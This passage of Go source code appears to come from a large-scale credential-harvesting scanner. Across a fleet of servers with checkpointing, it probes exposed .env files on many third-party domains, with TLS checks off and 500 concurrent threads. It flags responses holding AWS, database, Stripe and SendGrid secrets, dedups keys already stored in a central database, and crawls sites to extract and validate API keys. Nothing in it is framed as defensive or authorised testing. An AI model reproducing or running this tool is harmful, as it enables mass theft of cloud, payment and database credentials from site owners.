			globalCounters.ppsCount++
			if globalCounters.rpsCount > 0 {
				globalCounters.AvgRps = globalCounters.rpsTotal / float64(globalCounters.rpsCount)
				globalCounters.AvgPps = globalCounters.ppsTotal / float64(globalCounters.ppsCount)
			}
			rps := globalCounters.RequestsPerSec
			pps := globalCounters.ParsesPerSec
			avgRps := globalCounters.AvgRps
			avgPps := globalCounters.AvgPps
			processed := globalCounters.URLsProcessed
			found := globalCounters.APIsFoundTotal
			validated := globalCounters.APIsValidated
			loaded := globalCounters.URLsLoaded
			validHosts := globalCounters.ValidHosts
			invalidHosts := globalCounters.InvalidHosts
			globalCounters.mu.Unlock()

			var progression float64
			if loaded > 0 {
				progression = float64(processed) / float64(loaded)
			}

			statsData := map[string]interface{}{
				"urls_processed": processed,
				"apis_found":     found,
				"apis_validated": validated,
				"rps":            rps,
				"pps":            pps,
				"avg_rps":        avgRps,
				"avg_pps":        avgPps,
				"valid_hosts":    validHosts,
				"invalid_hosts":  invalidHosts,
				"progression":    progression,
				"urls_loaded":    loaded,
			}
			if b, err := json.Marshal(statsData); err == nil {
				_ = os.WriteFile(filepath.Join("ResultJS", "stats.json"), b, 0644)
			}
		}
	}()
}

func (a *AWSScanner) runBatched(listFile string) {
	renderBanner()
	a.logActiveAddons()

	pterm.Info.Println("Calculating total lines for progress bar...")
	totalLines, err := countLines(listFile)
	if err != nil {
		pterm.Error.Printfln("Failed to count lines: %v", err)
		os.Exit(1)
	}

	// If a checkpoint file exists and has a positive value, advance the effective
	// offset so the scanner resumes from where the previous run stopped.
	// The watchdog (bash) does NOT delete the checkpoint on restart, so this
	// fires automatically after any crash restart.  The Python redistribution
	// restart intentionally removes checkpoint.txt before relaunching (to start
	// fresh on the redistributed slice), which keeps this path a no-op there.
	if checkpointFile != "" {
		if ckData, ckErr := os.ReadFile(checkpointFile); ckErr == nil {
			if ckN, ckConv := strconv.Atoi(strings.TrimSpace(string(ckData))); ckConv == nil && ckN > 0 {
				lineOffset += ckN
				pterm.Info.Printfln("Resuming from checkpoint: skipping %d already-scanned lines (total offset now %d)", ckN, lineOffset)
			}
		}
	}

	// Clamp effective range to the portion this worker is responsible for.
	// lineOffset and lineLimit are set from --offset / --limit flags so the
	// controller can hand each VPS an exclusive slice of the same list file
	// without splitting or copying it:
	//   VPS1: --offset 0       --limit 500000
	//   VPS2: --offset 500000  --limit 500000
	//   VPS3: --offset 1000000 --limit 500000
	effectiveOffset := lineOffset
	if effectiveOffset < 0 {
		effectiveOffset = 0
	}
	if effectiveOffset > totalLines {
		effectiveOffset = totalLines
	}
	effectiveLimit := lineLimit
	if effectiveLimit <= 0 || effectiveOffset+effectiveLimit > totalLines {
		effectiveLimit = totalLines - effectiveOffset
	}
	effectiveTotal := effectiveLimit

	if lineOffset > 0 || (lineLimit > 0 && lineLimit != totalLines) {
		pterm.Info.Printfln("Fleet slice: offset=%d limit=%d (file has %d non-empty lines)",
			effectiveOffset, effectiveLimit, totalLines)
	}
	pterm.Info.Printfln("Total targets: %d. Batch size: %d. Timeout: %ds.", effectiveTotal, batchSize, requestTimeoutSeconds)
	globalCounters.URLsLoaded = effectiveTotal

	// Start the RPS/PPS rate tracker before the main scan loop begins.
	startRateTracker()

	a.ProgressBar, _ = pterm.DefaultProgressbar.
		WithTotal(effectiveTotal).
		WithTitle("Scanning Targets (Batched)").
		WithShowCount().
		WithShowElapsedTime().
		Start()

	file, err := os.Open(listFile)
	if err != nil {
		pterm.Error.Printfln("Could not open file '%s': %v", listFile, err)
		os.Exit(1)
	}
	defer file.Close()

	bufScanner := bufio.NewScanner(file)
	var batch []string
	linesRead := 0 // non-empty lines processed within our slice (written to checkpoint)
	skipped := 0   // non-empty lines consumed before our window begins

	for bufScanner.Scan() {
		line := strings.TrimSpace(bufScanner.Text())
		if line == "" {
			continue
		}

		// Skip lines before our offset window.
		if skipped < effectiveOffset {
			skipped++
			continue
		}

		// Stop once we've consumed our limit.
		if effectiveLimit > 0 && linesRead >= effectiveLimit {
			break
		}

		linesRead++
		batch = append(batch, line)

		if len(batch) >= batchSize {
			a.processBatch(batch)
			batch = nil
			runtime.GC()
			writeCheckpoint(checkpointFile, linesRead)
		} else if linesRead%1000 == 0 {
			// Fine-grained checkpoint: flush every 1 000 lines so the
			// redistribution logic has a near-current position even if
			// the scanner is killed mid-batch.
			writeCheckpoint(checkpointFile, linesRead)
		}
	}

	if len(batch) > 0 {
		a.processBatch(batch)
		batch = nil
		runtime.GC()
	}
	writeCheckpoint(checkpointFile, linesRead) // final checkpoint

	if err := bufScanner.Err(); err != nil {
		pterm.Error.Printfln("Error reading file: %v", err)
	}

	a.ProgressBar.Stop()
	a.DisplaySummary()
}

// runPrefilter probes 5 .env paths per domain in parallel and writes any URL
// whose response is HTTP 200 and whose body contains at least one of the
// well-known secret key tokens to outputFile.
func runPrefilter(listFile, outputFile string, threads int) {
	// Read domains from listFile.
	domFile, err := os.Open(listFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[PREFILTER] cannot open list file: %v\n", err)
		os.Exit(1)
	}
	var domains []string
	sc := bufio.NewScanner(domFile)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		// Strip any existing scheme so we can attach our own.
		line = strings.TrimPrefix(line, "https://")
		line = strings.TrimPrefix(line, "http://")
		line = strings.TrimRight(line, "/")
		if line != "" {
			domains = append(domains, line)
		}
	}
	domFile.Close()
	if err := sc.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "[PREFILTER] read error: %v\n", err)
	}

	// Build the full list of URLs to probe (5 paths per domain).
	envPaths := []string{
		"/.env",
		"/.env.local",
		"/api/.env",
		"/.env.production",
	}
	var targets []string
	for _, domain := range domains {
		// /.env gets both http and https; the rest are http-only.
		targets = append(targets, "http://"+domain+"/.env")
		targets = append(targets, "https://"+domain+"/.env")
		for _, p := range envPaths[1:] {
			targets = append(targets, "http://"+domain+p)
		}
	}

	secretTokens := []string{
		"APP_KEY=",
		"DB_PASSWORD=",
		"AWS_SECRET_ACCESS_KEY=",
		"API_KEY=",
		"SECRET_KEY=",
		"SENDGRID_API_KEY=",
		"STRIPE_SECRET_KEY=",
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
	}

	outFile, err := os.OpenFile(outputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[PREFILTER] cannot open output file: %v\n", err)
		os.Exit(1)
	}
	defer outFile.Close()

	var (
		mu       sync.Mutex
		hitCount int
	)

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, target := range targets {
		wg.Add(1)
		sem <- struct{}{}
		go func(rawURL string) {
			defer wg.Done()
			defer func() { <-sem }()

			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			req, reqErr := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
			if reqErr != nil {
				return
			}
			httpClient := &http.Client{Transport: transport, Timeout: 5 * time.Second}
			resp, doErr := httpClient.Do(req)
			if doErr != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode != 200 {
				return
			}

			bodyBytes, readErr := io.ReadAll(resp.Body)
			if readErr != nil {
				return
			}
			body := string(bodyBytes)

			for _, token := range secretTokens {
				if strings.Contains(body, token) {
					fmt.Printf("[PREFILTER] hit: %s\n", rawURL)
					mu.Lock()
					fmt.Fprintln(outFile, rawURL)
					hitCount++
					mu.Unlock()
					return
				}
			}
		}(target)
	}

	wg.Wait()
	fmt.Printf("Prefilter complete: %d hits from %d domains\n", hitCount, len(domains))
}

func main() {
	flag.IntVar(&requestTimeoutSeconds, "timeout", 20, "Global timeout for each HTTP request in seconds.")
	flag.IntVar(&batchSize, "batch", 500000, "Number of URLs to process per batch before forcing GC.")
	flag.StringVar(&checkpointFile, "checkpoint", "", "Write scan progress (lines read) to this file every 1000 lines for redistribution recovery.")
	flag.IntVar(&lineOffset, "offset", 0, "Skip the first N non-empty lines (fleet distribution: exclusive slice start).")
	flag.IntVar(&lineLimit, "limit", 0, "Process at most N non-empty lines (fleet distribution: exclusive slice size; 0 = all).")

	var ipOnlyMode bool
	flag.BoolVar(&ipOnlyMode, "ip-only", false, "Extract only IP addresses from input and scan them.")

	var prefilterMode bool
	var prefilterOutput string
	var prefilterThreads int
	flag.BoolVar(&prefilterMode, "prefilter", false, "Fast .env pre-filter mode: probe 5 .env paths per domain and record 200 hits.")
	flag.StringVar(&prefilterOutput, "output", "prefilter_hits.txt", "Output file for --prefilter hits.")
	flag.IntVar(&prefilterThreads, "threads", 500, "Goroutine concurrency for --prefilter mode.")

	flag.Parse()

	var listFile string
	listArgs := flag.Args()

	scanner := NewAWSScanner(defaultConfigPath)

	// Pre-load known credential keys from dedup.txt so we don't re-validate
	// credentials that are already in the central DB. The controller exports
	// this file (one key per line) and SCPs it before starting the scanner.
	// This prevents: (a) re-validating the same key after a worker restart,
	// (b) duplicate API calls when the same key appears on multiple domains.
	dedupLoaded := 0
	if dedupData, err := os.ReadFile("dedup.txt"); err == nil {
		for _, line := range strings.Split(string(dedupData), "\n") {
			if k := strings.TrimSpace(line); k != "" {
				scanner.KnownKeys.Store(k, true)
				dedupLoaded++
			}
		}
		if dedupLoaded > 0 {
			pterm.Info.Printf("Loaded %d known keys from dedup.txt — skipping re-validation\n", dedupLoaded)
		}
	}

	if len(listArgs) < 1 {
		listFile = interactiveMode()
	} else {
		listFile = listArgs[0]
	}

	if _, err := os.Stat(listFile); os.IsNotExist(err) {
		pterm.Error.Printfln("File '%s' not found.", listFile)
		os.Exit(1)
	}

	// Prefilter mode: fast .env probe — no deep crawl, no credential extraction.
	if prefilterMode {
		runPrefilter(listFile, prefilterOutput, prefilterThreads)
		return
	}

	// IP-only mode: extract IPs and scan them
	if ipOnlyMode {
		f, err := os.Open(listFile)
		if err != nil {
			pterm.Error.Printfln("Error opening file: %v", err)
			os.Exit(1)
		}
		defer f.Close()

		fileScanner := bufio.NewScanner(f)
		allIPs := []string{}
		for fileScanner.Scan() {
			line := fileScanner.Text()
			ips := scanner.ExtractIPOnly(line)
			allIPs = append(allIPs, ips...)
		}

		// Write unique IPs to temp file
		uniqueIPs := make(map[string]bool)
		tempFile, _ := ioutil.TempFile("", "raven-ips-*.txt")
		defer os.Remove(tempFile.Name())

		for _, ip := range allIPs {
			if !uniqueIPs[ip] {
				uniqueIPs[ip] = true
				tempFile.WriteString("http://" + ip + "\n")
				tempFile.WriteString("https://" + ip + "\n")
			}
		}
		tempFile.Close()

		listFile = tempFile.Name()
		pterm.Info.Printfln("IP-only mode: Extracted %d unique IPs, scanning as URLs...", len(uniqueIPs))
	}

	mainClient := &http.Client{
		Timeout: time.Duration(requestTimeoutSeconds) * time.Second,
	}

	enhancer := NewEnhancer(mainClient)
	enhancer.EnhanceScanner(scanner)

	f, err := os.Open(listFile)
	if err == nil {
		sc := bufio.NewScanner(f)
		if sc.Scan() {
			firstURL := strings.TrimSpace(sc.Text())
			go enhancer.CrawlAndExtract(firstURL, 2, scanner)
			pterm.Info.Println("Enhancer pre-scan activated for:", firstURL)
		}
		f.Close()
	}

	scanner.runBatched(listFile)
}
